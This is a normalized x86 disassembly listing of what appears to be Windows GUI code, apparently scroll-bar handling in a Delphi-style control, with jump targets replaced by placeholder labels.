mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418bac
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4614e8
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4614c8
mov edx [ edi + 0xc ]
mov eax ebx
call sub_461378
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_460c70
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_460e28
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44a494
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_461378
xor edx edx
mov eax ebx
call sub_461378
jmp r-xdata
sub_460ca8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4299ac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_460d14
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4299ac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_460d7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4614b0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4614b0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44d410
call sub_460d14
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44d410
call sub_460ca8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_460e28
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_460e60
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_460e94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_460e60
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_460e60
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_460f10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_460e94
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_449824
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_460e94
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_449868
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460fa8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_461008
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4611d9 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460f10
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460f10
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_461378
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
push ebp
call sub_460fa8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
push ebp
call sub_460fa8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406ad0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_461378
jmp r-xdata
sub_461300
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4619f0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_461378
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_45071c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_45071c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4502d4
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4502d4
jmp r-xdata
call sub_460ae8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46143c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4619f0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4614f4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call sub_42ba98
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call sub_42ba98
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call sub_42ba98
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423b68
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call sub_42ba98
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
call sub_42ba98
sub_4615fc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460f10
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460f10
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4614f4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45071c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_461378
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_460f10
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_461714
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c448
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_460b90
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_460b90
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46178c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403154
mov eax [ esi + 0x20c ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c56c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4617d8
push ebx
mov ebx eax
mov eax ebx
call sub_44d6d4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4619f0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bed8
test al al
jne r-xdata
mov eax ebx
call sub_45071c
push eax
call sub_42bacc
sub_461818
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_461970
mov ecx edi
mov edx esi
mov eax ebx
call sub_44ce1c
pop edi
pop esi
pop ebx
retn
sub_461858
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_461960
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_449824
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_460e28
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_461378
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418454
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_449590
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461967
mov eax [ ebp - 0x10 ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460c70
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4185b0
xor ecx ecx
mov edx 0xb03e
call sub_44afd4
inc ebx
dec esi
jne r-xdata
sub_461994
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4614c8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4614c8
mov eax ebx
call sub_461970
jmp r-xdata
sub_4619f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
xor eax eax
push ebp
push sub_461adb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_460f90
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460f90
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4615fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4615fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4615fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4615fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4615fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4615fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_461b00
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_449938
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_449964
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_449938
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_449964
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_449824
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_461378
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_449824
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_449868
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_461378
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_449824
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_461378
mov eax ebx
call sub_449824
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_449868
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_449868
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_461378
mov eax ebx
call sub_449868
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_461c54
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_461378
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_461378
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4614c8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4614c8
sub_461cf8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_461c54
mov ecx edi
mov edx esi
mov eax ebx
call sub_450228
pop edi
pop esi
pop ebx
retn
sub_461d20
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_461d8a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
